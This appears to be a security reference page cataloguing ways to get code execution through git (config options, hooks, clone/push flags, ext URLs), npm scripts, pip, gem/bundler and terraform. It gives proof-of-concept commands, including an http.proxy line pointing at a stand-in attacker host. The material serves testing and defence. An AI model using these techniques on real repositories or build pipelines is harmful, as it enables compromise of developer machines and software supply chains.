# git

{% embed url="https://git-scm.com/docs/git" %}

## -c/--config-env

[-c/--config-env](https://git-scm.com/docs/git#Documentation/git.txt--cltnamegtltvaluegt) passes a configuration parameter to the command. The value given will override values from configuration files. Check out the [Abuse via .git/config](#abuse-via-gitconfig) section to find parameters that can be abused.

## Abusing a git directory

A git directory maintains internal state, or metadata, relating to a git repository. It is created on a user's machine when:

- The user does `git init` to intialise an empty local repository
- The user does `git clone <repository>` to clone an existing repository from a remote location

The structure of a git directory is documented at https://git-scm.com/docs/gitrepository-layout

Note that a git directory is often, but not always, a directory named `.git` at the root of a repo. There are several variables that can redefine a path:

- [GIT_DIR](https://git-scm.com/docs/git#Documentation/git.txt-codeGITDIRcode) environment variable or [--git-dir](https://git-scm.com/docs/git#Documentation/git.txt---git-dirltpathgt) command-line option specifies a path to use instead of the default `.git` for the base of the repository.
- [GIT_COMMON_DIR](https://git-scm.com/docs/git#Documentation/git.txt-codeGITCOMMONDIRcode) environment variable or [commondir](https://git-scm.com/docs/gitrepository-layout#Documentation/gitrepository-layout.txt-commondir) file specifies a path from which non-worktree files will be taken, which are normally in `$GIT_DIR`.

Notice that the [bare repos](https://git-scm.com/docs/git-init#Documentation/git-init.txt---bare) do not have a `.git` directory at all.

References:
- [Writeup: gh run download implementation allows overwriting git repository configuration upon artifacts downloading](https://github.com/Metnew/write-ups/blob/e6f65cf6ff60434a37ee230d828336809dd25f5a/rce-gh-cli-run-download/README.md)

### Abuse via .git/config

`.git/config` allows for the configuration of [options](https://git-scm.com/docs/git-config#_variables) on a per-repo basis. Many of the options allow for the specification of commands that will be executed in various situations, but some of these situations only arise when a user interacts with a git repository in a particular way.

There are at least the following ways to set the options:

1. On a system-wide basis using [/etc/gitconfig](https://git-scm.com/docs/git-config#Documentation/git-config.txt-prefixetcgitconfig) file
2. On a global basis using [~/git/config](https://git-scm.com/docs/git-config#Documentation/git-config.txt-XDGCONFIGHOMEgitconfig) or [~/.gitconfig](https://git-scm.com/docs/git-config#Documentation/git-config.txt-gitconfig) files
3. On a local per-repo basis using [.git/config](https://git-scm.com/docs/git-config#Documentation/git-config.txt-GITDIRconfig) file
4. On a local per-repo basis using [.git/config.worktree](https://git-scm.com/docs/git-config#Documentation/git-config.txt-GITDIRconfigworktree) file. This is optional and is only searched when `extensions.worktreeConfig` is present in `.git/config`
5. On a local per-repo basis using [git -c/--config-env](https://git-scm.com/docs/git#Documentation/git.txt--cltnamegtltvaluegt) option
6. On a local per-repo basis using [git-clone -c/--config](https://git-scm.com/docs/git-clone#Documentation/git-clone.txt--cltkeygtltvaluegt) option

#### core.gitProxy

[core.gitProxy](https://git-scm.com/docs/git-config#Documentation/git-config.txt-coregitProxy) gives a command that will be executed when establishing a connection to a remote using the `git://` protocol

```bash
$ echo $'#!/bin/bash\necho \\"Pwned as $(id)\\">&2' > pwn.sh
$ chmod +x pwn.sh
$ git clone -c core.gitProxy="./pwn.sh" git://github.com/user/project.git
Cloning into 'project'...
"Pwned as uid=0(root) gid=0(root) groups=0(root)"
fatal: Could not read from remote repository.

Please make sure you have the correct access rights and the repository exists.
```

#### core.fsmonitor

The [core.fsmonitor](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corefsmonitor) option is used as a command which will identify all files that may have changed since the requested date/time.

In other words, many operations provided by the git will invoke the command given by `core.fsmonitor` to quickly limit the operation's scope to known-changed files in the interest of performance.

At least the following git operations invoke the command given by `core.fsmonitor`:

- `git status` used to show information about the state of the working tree, including whether any files have uncommitted changes
- `git add <pathspec>` used to stage changes for committing to the repo
- `git rm --cached <file>` used to unstage changes
- `git commit` used to commit staged changes
- `git checkout <pathspec>` used to check out a file, commit, tag, branch, etc.

For operations that take a filename, `core.fsmonitor` will fire even if the filename provided does not exist.

```bash
$ cd $(mktemp -d)
# initialized empty Git repository in /tmp/tmp.hLncfRcxgC/.git/
$ git init
# change core.fsmonitor so that it echoes a message to STDERR whenever it is invoked
$ echo $'\tfsmonitor = "echo \\"Pwned as $(id)\\">&2; false"' >> .git/config
$ cat .git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	fsmonitor = "echo \"Pwned as $(id)\">&2; false"
# git-status
$ git status
Pwned as uid=0(root) gid=0(root) groups=0(root)
Pwned as uid=0(root) gid=0(root) groups=0(root)
On branch main

No commits yet

nothing to commit (create/copy files and use "git add" to track)

# git-add
$ touch aaaa
$ git add aaaa
Pwned as uid=0(root) gid=0(root) groups=0(root)
Pwned as uid=0(root) gid=0(root) groups=0(root)

$ git add zzzz
Pwned as uid=0(root) gid=0(root) groups=0(root)
Pwned as uid=0(root) gid=0(root) groups=0(root)
fatal: pathspec 'zzzz' did not match any files

# git-commit
$ git commit -m 'add aaaa'
Pwned as uid=0(root) gid=0(root) groups=0(root)
Pwned as uid=0(root) gid=0(root) groups=0(root)
[main (root-commit) 7c2f2c6] add aaaa
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 aaaa
```

References:
- [Research: Git honours embedded bare repos, and exploitation via core.fsmonitor in a directory's .git/config affects IDEs, shell prompts and Git pillagers](https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md)
- [Research: Securing Developer Tools - Git Integrations](https://blog.sonarsource.com/securing-developer-tools-git-integrations)

#### core.hooksPath

[core.hooksPath](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) sets different path to [hooks](https://git-scm.com/docs/githooks). You can create the post checkout hook within a repository, set the path to hooks with the `hooksPath`, and execute arbitrary code.

```bash
$ git clone "<REPO>" target_directory
$ cd target_directory
$ mkdir hooks
$ echo "#!/bin/sh" > hooks/post-checkout
$ echo "echo 'arbitrary code here'" >> hooks/post-checkout
$ # commit and push
```

To execute the payload, run the `git-clone`:

```bash
$ git clone -c core.hooksPath=hooks "<REPO>"
```

References:
- [git-config docs: core.hooksPath](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath)
- [githooks docs](https://git-scm.com/docs/githooks)

#### core.sshCommand

[core.sshCommand](https://git-scm.com/docs/git-config#Documentation/git-config.txt-coresshCommand) gives a command that will be executed when establishing a connection to a remote using the SSH protocol. If this variable is set, `git fetch` and `git push` will use the specified command instead of `ssh` when they need to connect to a remote system.

```bash
$ echo $'#!/bin/bash\necho \\"Pwned as $(id)\\">&2' > pwn.sh
$ chmod +x pwn.sh
$ git clone -c core.sshCommand="./pwn.sh" git@github.com:user/project.git
# or
$ git clone -c core.sshCommand="./pwn.sh" ssh://github.com/user/project.git
Cloning into 'project'...
"Pwned as uid=0(root) gid=0(root) groups=0(root)"
fatal: Could not read from remote repository.

Please make sure you have the correct access rights and the repository exists.
```

#### diff.external

[diff.external](https://git-scm.com/docs/git-config#Documentation/git-config.txt-diffexternal) gives a command that will be used instead of git's internal diff function.

```bash
$ echo $'#!/bin/bash\necho \\"Pwned as $(id)\\">&2' > pwn.sh
$ chmod +x pwn.sh
$ git clone https://github.com/user/project.git
$ cd project
$ git -c diff.external="../pwn.sh" HEAD 480e4c9
"Pwned as uid=0(root) gid=0(root) groups=0(root)"
```

#### filter.&lt;driver&gt;.clean and filter.&lt;driver&gt;.smudge

[filter.<driver>.clean](https://git-scm.com/docs/git-config#Documentation/git-config.txt-filterltdrivergtclean) is used to convert the content of a worktree file to a blob upon checkin.

[filter.<driver>.smudge](https://git-scm.com/docs/git-config#Documentation/git-config.txt-filterltdrivergtsmudge) is used to convert the content of a blob object to a worktree file upon checkout.

```bash
$ cd $(mktemp -d)
# initialized empty Git repository in /tmp/tmp.hLncfRcxgC/.git/
$ git init
# filter.&lt;driver&gt;.clean and filter.&lt;driver&gt;.smudge
# so that they echo a message to STDERR whenever they are invoked
$ echo $'[filter "any"]\n\tsmudge = echo \\"Pwned smudge as $(id)\\">&2\n\tclean = echo \\"Pwned clean as $(id)\\">&2' >> ./.git/config
# add filter to .gitattributes
$ touch example
$ git add ./example
$ git commit -m 'commit'
$ echo "*  text  filter=any" > .gitattributes
$ git status
Pwned clean as uid=0(root) gid=0(root) groups=0(root)
On branch master
Untracked files:
  (use "git add <file>..." to include in what will be committed)
	.gitattributes

nothing added to commit but untracked files present (use "git add" to track)

$ git add .gitattributes
Pwned clean as uid=0(root) gid=0(root) groups=0(root)
```

```bash
$ cd $(mktemp -d)
# initialized empty Git repository in /tmp/tmp.hLncfRcxgC/.git/
$ git init
# filter.&lt;driver&gt;.clean and filter.&lt;driver&gt;.smudge
# so that they echo a message to STDERR whenever they are invoked
$ echo $'[filter "any"]\n\tsmudge = echo \\"Pwned smudge as $(id)\\">&2\n\tclean = echo \\"Pwned clean as $(id)\\">&2' >> ./.git/config
# add filter to .gitattributes
$ echo "*  text  filter=any" > .gitattributes
$ git fetch
$ git checkout main
Pwned smudge as uid=0(root) gid=0(root) groups=0(root)
Pwned smudge as uid=0(root) gid=0(root) groups=0(root)
Branch 'main' set up to track remote branch 'main' from 'origin'.
Switched to a new branch 'main'
```

References:
- [Write up: RCE in GitHub Desktop < 2.9.4](https://github.com/Metnew/write-ups/tree/main/rce-github-desktop-2.9.3)

#### http.proxy and http.&lt;URL&gt;.proxy

`http.proxy` or `http.<URL>.proxy` override the HTTP proxy. You can use this to get SSRF:

```bash
$ git clone -c http.proxy=http://attacker-website.com -- "<REPO>" target_directory
$ git clone -c http.http://website.com/.proxy=http://attacker-website.com -- "<REPO>" target_directory
```

Pay attention to other `http.*` configs and `remote.<name>.proxy`, they can help to increase the impact.

References:
- [Report: Injection of `http.<url>.*` git config settings leading to SSRF](https://hackerone.com/reports/855276)
- [git-config docs: http.proxy](https://git-scm.com/docs/git-config#Documentation/git-config.txt-httpproxy)
- [git-config docs: remote.<name>.proxy](https://git-scm.com/docs/git-config#Documentation/git-config.txt-remoteltnamegtproxy)

### Abuse via .git/hooks/

Various files within [.git/hooks/](https://git-scm.com/docs/githooks) are [executed upon certain git operations](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks). For example:

- `pre-commit` and `post-commit` are executed before and after a commit operation respectively
- `post-checkout` is executed after checkout operation
- `pre-push` is executed before a push operation

On filesystems that differentiate between executable and non-executable files, Hooks are only executed if the respective file is executable. Furthermore, hooks only execute given certain user interaction, such as upon performing a commit.

For instance, you can use bare repositories to deliver custom git hooks and execute arbitrary code:

```bash
# clone or create a repo
$ git clone "<REPO>" target_directory
$ cd target_directory
# add subproject as a bare repo
$ mkdir subproject
$ cd subproject
$ git init --bare
# add malicious hook
$ echo "#!/bin/sh" > hooks/post-checkout
$ echo "echo 'arbitrary code here'" >> hooks/post-checkout
# commit and push
```

If the vulnerable code executes the following bash commands against the prepared repository, it will trigger the custom hook execution and result in the arbitrary code being executed:

```bash
$ git clone -- "<REPO>" "target_directory"
$ cd "target_directory"
$ git checkout "subproject"
```

References:
- [Writeup: 4 Google Cloud Shell bugs explained – bug #3](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-3/)
- [Research: Git honours embedded bare repos, and exploitation via core.fsmonitor in a directory's .git/config affects IDEs, shell prompts and Git pillagers](https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md)

### Abuse via .git/index

You can achieve an arbitrary write primitive using a crafted `.git/index` file, check an [advisory](https://drivertom.blogspot.com/2021/08/git.html).

## git-clone

{% embed url="https://git-scm.com/docs/git-clone" %}

### -c/--config

[-c/--config](https://git-scm.com/docs/git-clone#Documentation/git-clone.txt--cltkeygtltvaluegt) sets a configuration variable in the newly-created repository; this takes effect immediately after the repository is initialized, but before the remote history is fetched or any files checked out. Check the [Abuse via .git/config](#abuse-via-gitconfig) section to find variables that can be abused.

### ext URLs

`git-clone` allows shell commands to be specified in `ext` URLs for remote repositories. For instance, the next example will execute the whoami command to try to connect to a remote repository:

```bash
$ git clone 'ext::sh -c whoami% >&2'
```

References:
- [git-remote-ext docs](https://git-scm.com/docs/git-remote-ext)

### &lt;directory&gt;

`git-clone` allows specifying a new directory to clone into. Cloning into an existing directory is only allowed if the directory is empty. You can use this to write a repo outside a default folder.

```bash
$ git clone -- "<REPO>" target_directory
```

### -u/--upload-pack

[upload-pack](https://git-scm.com/docs/git-clone#Documentation/git-clone.txt--ultupload-packgt) specifies a non-default path for the command run on the other end when the repository to clone from is accessed via ssh. You can execute arbitrary code like this:

```bash
$ mkdir repo
$ cd repo
$ git init
$ cd -
$ echo "#!/bin/bash" > payload.sh
$ echo "echo 'arbitrary payload here'" >> payload.sh
$ chmod +x payload.sh
$ git clone --upload-pack=payload.sh repo
```

References:
- [Write up: Securing Developer Tools Package Managers - Argument Injections in Bundler and Poetry](https://blog.sonarsource.com/securing-developer-tools-package-managers)

## git-grep

{% embed url="https://git-scm.com/docs/git-grep" %}

### --no-index

`no-index` tells the git-grep to search files in the current directory that is not managed by Git. In other words, if a working directory is different from a repository one `no-index` allows you to get access to files in the working directiory.

References:
- [Report: Git flag injection - Search API with scope 'blobs'](https://hackerone.com/reports/682442)

## git-log

{% embed url="https://git-scm.com/docs/git-log" %}

### --output

`output` define a specific file to output instead of stdout. You can use this to rewrite arbitrary files.

```bash
$ git log --output=/tmp/arbitrary_file
$ cat /tmp/arbitrary_file
commit c79538fb19b1d9d21bf26e9ad30fdeb90be1eaf0
Author: User <user@local>
Date:   Fri Aug 29 00:00:00 2021 +0000

    Controlled content
```

References:
- [Report: Git flag injection - local file overwrite to remote code execution](https://hackerone.com/reports/658013)
- [Report: Git flag injection leading to file overwrite and potential remote code execution](https://hackerone.com/reports/653125)

## git-push

{% embed url="https://git-scm.com/docs/git-push" %}

### --receive-pack/--exec

[receive-pack or exec](https://git-scm.com/docs/git-push#Documentation/git-push.txt---receive-packltgit-receive-packgt) specifies a path to the [git-receive-pack](https://git-scm.com/docs/git-receive-pack) program on the remote end. You can execute arbitrary code like this:

```bash
$ echo "#!/bin/bash" > payload.sh
$ echo "echo 'arbitrary payload here'" >> payload.sh
$ chmod +x payload.sh
$ git push --receive-pack=payload.sh username/repo main
# or
$ git push --exec=payload.sh username/repo main
# or
$ git push --receive-pack=payload.sh main
```

# npm scripts

The [scripts](https://docs.npmjs.com/cli/v7/using-npm/scripts) property of the `package.json` file supports a number of built-in scripts and their preset life cycle events as well as arbitrary scripts. These all can be executed using [npm run-script or npm run for short](https://docs.npmjs.com/cli/v7/commands/npm-run-script). 

{% hint style="info" %}
Scripts from dependencies can be run with `npm explore <pkg> -- npm run <stage>`
{% endhint %}

Pre and post commands with matching names will be run for those as well (e.g. premyscript, myscript, postmyscript). To create pre or post scripts for any scripts defined in the `scripts` section of the `package.json`, simply create another script with a matching name and add `pre` or `post` to the beginning of them.

In the following example `npm run compress` would execute these scripts as described.

```json
{
  "scripts": {
    "precompress": "{{ executes BEFORE the `compress` script }}",
    "compress": "{{ run command to compress files }}",
    "postcompress": "{{ executes AFTER `compress` script }}"
  }
}
```

There are some special life cycle scripts that happen only in certain situations. These scripts happen in addition to the `pre<event>`, `post<event>`, and `<event>` scripts.

- `prepare` (since npm@4.0.0)
    - Runs any time before the package is packed, i.e. during `npm publish` and `npm pack`
    - Runs BEFORE the package is packed
    - Runs BEFORE the package is published
    - Runs on local `npm install` without any arguments
    - Run AFTER `prepublish`, but BEFORE `prepublishOnly`
    - NOTE: If a package being installed through git contains a `prepare` script, its `dependencies` and `devDependencies` will be installed, and the prepare script will be run, before the package is packaged and installed
    - As of `npm@7` these scripts run in the background. To see the output, run with: `--foreground-scripts`
- `prepublish` ([DEPRECATED](https://docs.npmjs.com/cli/v7/using-npm/scripts#prepare-and-prepublish))
    - Does not run during `npm publish`, but does run during `npm ci` and `npm install`
- `prepublishOnly`
    - Runs BEFORE the package is prepared and packed, ONLY on `npm publish`
- `prepack`
    - Runs BEFORE a tarball is packed (on `npm pack`, `npm publish`, and when installing a git dependencies)
    - NOTE: `npm run pack` is NOT the same as `npm pack`. `npm run pack` is an arbitrary user defined script name, where as, `npm pack` is a CLI defined command
- `postpack`
    - Runs AFTER the tarball has been generated but before it is moved to its final destination (if at all, publish does not save the tarball locally)

## npm cache add

[npm cache add](https://docs.npmjs.com/cli/v7/commands/npm-cache) runs the following life cycle scripts:

- `prepare`

## npm ci

[npm ci](https://docs.npmjs.com/cli/v7/commands/npm-ci) runs the following life cycle scripts:

- `preinstall`
- `install`
- `postinstall`
- `prepublish`
- `preprepare`
- `prepare`
- `postprepare`

These all run after the actual installation of modules into `node_modules`, in order, with no internal actions happening in between.

## npm diff

[npm diff](https://docs.npmjs.com/cli/v7/commands/npm-diff) runs the following life cycle scripts:

- `prepare`

## npm install

[npm install](https://docs.npmjs.com/cli/v7/commands/npm-install) runs the following life cycle scripts (also run when you run `npm install -g <pkg-name>`):

- `preinstall`
- `install`
- `postinstall`
- `prepublish`
- `preprepare`
- `prepare`
- `postprepare`

If there is a `binding.gyp` file in the root of a package and install or preinstall scripts were not defined, `npm` will default the `install` command to compile using [node-gyp](https://www.npmjs.com/package/node-gyp) via `node-gyp rebuild`.

## npm pack

[npm pack](https://docs.npmjs.com/cli/v7/commands/npm-pack) runs the following life cycle scripts:

- `prepack`
- `prepare`
- `postpack`

## npm publish

[npm publish](https://docs.npmjs.com/cli/v7/commands/npm-publish) runs the following life cycle scripts:

- `prepublishOnly`
- `prepack`
- `prepare`
- `postpack`
- `publish`
- `postpublish`

`prepare` will not run during `--dry-run`

## npm rebuild

[npm rebuild](https://docs.npmjs.com/cli/v7/commands/npm-rebuild) runs the following life cycle scripts:

- `preinstall`
- `install`
- `postinstall`
- `prepare`

`prepare` is only run if the current directory is a symlink (e.g. with linked packages)

## npm restart

[npm restart](https://docs.npmjs.com/cli/v7/commands/npm-restart) runs a restart script if it was defined, otherwise stop and start are both run if present, including their pre and post iterations):

- `prerestart`
- `restart`
- `postrestart`

## npm start

[npm start](https://docs.npmjs.com/cli/v7/commands/npm-start) runs the following life cycle scripts:

- `prestart`
- `start`
- `poststart`

If there is a `server.js` file in the root of your package, then `npm` will default the start command to node `server.js`. `prestart` and `poststart` will still run in this case.

## npm stop

[npm stop](https://docs.npmjs.com/cli/v7/commands/npm-stop) runs the following life cycle scripts:

- `prestop`
- `stop`
- `poststop`

## npm test

[npm test](https://docs.npmjs.com/cli/v7/commands/npm-test) runs the following life cycle scripts:

- `pretest`
- `test`
- `posttest`

# pip

## pip install

Extending the `setuptools` modules allows you to hook almost any `pip` command. For instance, you can use the `install` class within `setup.py` file to execute an arbitrary code during `pip install` running. 

```python
from setuptools import setup
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        # Insert code here
        install.run(self)

setup(
    ...
    cmdclass={
        'install': PostInstallCommand,
    },
    ...
)
```

When `pip install` is run the `PostInstallCommand.run` method will be invoked.

References:
- [0wned - Code execution via Python package installation](https://github.com/mschwager/0wned)

# gem

## gem build

`gemspec` file is a ruby file that defines what is in the gem, who made it, and the version of the gem. Since it is a ruby file you can write arbitrary code that will be executed when running `gem build`.

```ruby
# hola.gemspec file

# arbitrary code here
system('echo "hola!"')

Gem::Specification.new do |s|
  s.name        = 'hola'
  s.version     = '0.0.0'
  s.summary     = "Hola!"
  s.description = "A simple hello world gem"
  s.authors     = ["Nick Quaranto"]
  s.email       = 'nick@quaran.to'
  s.files       = []
  s.homepage    = 'https://rubygems.org/gems/hola'
  s.license     = 'MIT'
end
```

When `gem build` is run the arbitrary ruby code will be executed.

```bash
$ gem build hola.gemspec
hola!
  Successfully built RubyGem
  Name: hola
  Version: 0.0.0
  File: hola-0.0.0.gem
```

References:
- [RubyGames Guides: Make your own gem](https://guides.rubygems.org/make-your-own-gem/)
- [RubyGames Guides: Command reference - gem build](https://guides.rubygems.org/command-reference/#gem-build)

## gem install

### Extensions

`gemspec` allows you to define extensions to build when installing a gem. Many gems use extensions to wrap libraries that are written in C with a ruby wrapper. `gem` uses the `extconf.rb` to build an extension during installation. Since it is a ruby file you can write arbitrary code that will be executed when running `gem install`.

```ruby
# hola.gemspec file

Gem::Specification.new do |s|
  s.name        = 'hola'
  s.version     = '0.0.0'
  s.summary     = "Hola!"
  s.description = "A simple hello world gem"
  s.authors     = ["Nick Quaranto"]
  s.email       = 'nick@quaran.to'
  s.files       = []
  s.homepage    = 'https://rubygems.org/gems/hola'
  s.license     = 'MIT'
  s.extensions  = 'extconf.rb'
end
```

```ruby
# extconf.rb

# arbitrary code here
system('echo "hola!"')
```

```bash
$ gem build hola.gemspec
  Successfully built RubyGem
  Name: hola
  Version: 0.0.0
  File: hola-0.0.0.gem
```

When `gem install` is run the arbitrary ruby code will be executed.

```bash
$ gem install ./hola-0.0.0.gem
Building native extensions. This could take a while...
ERROR:  Error installing hola-0.0.0.gem:
        ERROR: Failed to build gem native extension.
...
hola!
...
```

References:
- [RubyGames Guides: Gems with extensions](https://guides.rubygems.org/gems-with-extensions/)
- [RubyGames Guides: Specification reference - Extensions](https://guides.rubygems.org/specification-reference/#extensions)
- [RubyGames Guides: Command reference - gem install](https://guides.rubygems.org/command-reference/#gem-install)

# bundler

## bundler install

[bundler install](https://bundler.io/v2.2/man/bundle-install.1.html) uses `gem` under the hood, therefore, it is possible to reuse gem's features for giving a profit.

### Gemfile

[Gemfile](https://bundler.io/v2.2/man/gemfile.5.html) describes the gem dependencies required to execute associated Ruby code. Since it is a ruby file you can write arbitrary code that will be executed when running `bundle install`.

```ruby
# Gemfile

# arbitrary code here
system('echo "hola!"')
```

When `bundle install` is run the arbitrary ruby code will be executed.

```bash
$ bundle install
hola!
hola!
The Gemfile specifies no dependencies
Resolving dependencies...
Bundle complete! 0 Gemfile dependencies, 1 gem now installed.
```

### gem dependency

Since `bundler` uses `gem install` to install the specified dependencies in `Gemfile` you can use extensions to embed an arbitrary code.

```ruby
# hola.gemspec file

Gem::Specification.new do |s|
  s.name        = 'hola'
  s.version     = '0.0.0'
  s.summary     = "Hola!"
  s.description = "A simple hello world gem"
  s.authors     = ["Nick Quaranto"]
  s.email       = 'nick@quaran.to'
  s.files       = []
  s.homepage    = 'https://rubygems.org/gems/hola'
  s.license     = 'MIT'
  s.extensions  = 'extconf.rb'
end
```

```ruby
# extconf.rb

# arbitrary code here
system('echo "hola!"')
```

```bash
# build and push to rubygems.org
$ gem build hola.gemspec
$ gem push ./hola-0.0.0.gem
```

```ruby
# Gemfile

source 'https://rubygems.org'

gem 'hola'
```

When `bundle install` is run the arbitrary ruby code will be executed.

```bash
$ gem install ./hola-0.0.0.gem
Building native extensions. This could take a while...
ERROR:  Error installing hola-0.0.0.gem:
        ERROR: Failed to build gem native extension.
...
hola!
...
```

References:
- [RubyGames Guides: Make your own gem](https://guides.rubygems.org/make-your-own-gem/)
- [RubyGames Guides: Gems with extensions](https://guides.rubygems.org/gems-with-extensions/)
- [RubyGames Guides: Specification reference - Extensions](https://guides.rubygems.org/specification-reference/#extensions)
- [Bundler Docs: gemfile - Gems](https://bundler.io/v1.16/gemfile_man.html#GEMS)

### git dependency

One of the sources of gems for `bundler` are git repositories with a gem's source code. Since a git repositories contains a source code `bundler` builds it before installing. Therefore, you can write an arbitrary code that will be executed when running `bundle install`.

{% hint style="info" %}
You can execute an arbitrary code using both [gemspec](#gem-build) file and [native extensions](#extensions)
{% endhint %}

Create a repository on `github.com` with the following `hola.gemspec` file:

```ruby
# arbitrary code here
system('echo "hola!"')

Gem::Specification.new do |s|
  s.name        = 'hola'
  s.version     = '0.0.0'
  s.summary     = "Hola!"
  s.description = "A simple hello world gem"
  s.authors     = ["Nick Quaranto"]
  s.email       = 'nick@quaran.to'
  s.files       = []
  s.homepage    = 'https://rubygems.org/gems/hola'
  s.license     = 'MIT'
end
```

Add the repository to `Gemfile` as a git dependency.

```ruby
# Gemfile
gem 'hola', :git => 'https://github.com/username/hola'
```

When `bundle install` is run the arbitrary ruby code will be executed.

```bash
$ bundle install
Fetching https://github.com/username/hola
hola!
Resolving dependencies...
Using bundler 2.2.21
Using hola 0.0.0 from https://github.com/username/hola (at main@4a4a4ee)
Bundle complete! 1 Gemfile dependency, 2 gems now installed.
```

References:
- [Bundler Docs: gemfile - Git](https://bundler.io/v1.16/gemfile_man.html#GIT)

### path dependency

You can specify that a gem is located in a particular location on the file system. Relative paths are resolved relative to the directory containing the `Gemfile`. Since a git repositories contains a source code `bundler` builds it before installing. Therefore, you can write an arbitrary code that will be executed when running `bundle install`.

You can specify that a gem is located in a particular location on the file system. Relative paths are resolved relative to the directory containing the `Gemfile`.

Similar to the semantics of the `:git` option, the `:path` option requires that the directory in question either contains a `.gemspec` for the gem, or that you specify an explicit version that bundler should use.

{% hint style="info" %}
Unlike `:git`, `bundler` does not compile native extensions for gems specified as paths
{% endhint %}

Therefore, you can gain code execution using the [.gemspec file with an arbitrary code](#gem-build) or [built gem with native extension](#extensions).

```ruby
# Gemfile
# .gemspec file is located in vendor/hola 
gem 'hola', :path => "vendor/hola"
```

```ruby
# Gemfile
# vendor/hola contains hola-0.0.0.gem file
gem 'hola', '0.0.0', :path => "vendor/hola"
```

When `bundle install` is run the arbitrary ruby code will be executed.

```bash
$ bundle install
hola!
Resolving dependencies...
Using hola 0.0.0 from source at `vendor/hola`
Using bundler 2.2.21
Bundle complete! 1 Gemfile dependency, 2 gems now installed.
```

References:
- [Bundler Docs: gemfile - Path](https://bundler.io/v1.16/gemfile_man.html#PATH)

# terraform

## terraform-plan

Terraform relies on plugins called ["providers"](https://www.terraform.io/docs/language/providers/configuration.html) to interact with remote systems. Terraform configurations must declare which providers they require, so that Terraform can install and use them. 

You can write a [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup), publish it to the [Terraform Registry](https://registry.terraform.io/) and add the provider to the Terraform code.

```tf
terraform {
  required_providers {
    evil = {
      source  = "evil/evil"
      version = "1.0"
    }
  }
}

provider "evil" {}
```

```bash
$ terraform init
$ terraform plan
```

The provider will be pulled in during `terraform init` and when `terraform plan` is run the arbitrary ruby code will be executed.

Additionally, Terraform offers the [external provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) which provides a way to interface between Terraform and external programs. Therefore, you to use the `external` data source to run arbitrary code. The following example from [docs](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source) executes a python script during `terraform plan`.

```tf
data "external" "example" {
  program = ["python", "${path.module}/example-data-source.py"]

  query = {
    # arbitrary map from strings to strings, passed
    # to the external program as the data query.
    id = "abc123"
  }
}
```

References:
- [Terraform Plan "RCE"](https://alex.kaskaso.li/post/terraform-plan-rce)
- [Terraform Docs: Command: plan](https://www.terraform.io/docs/cli/commands/plan.html)
- [Terraform Docs: Provider Configuration](https://www.terraform.io/docs/language/providers/configuration.html)
- [Terraform Docs: The Module providers Meta-Argument](https://www.terraform.io/docs/language/meta-arguments/module-providers.html)
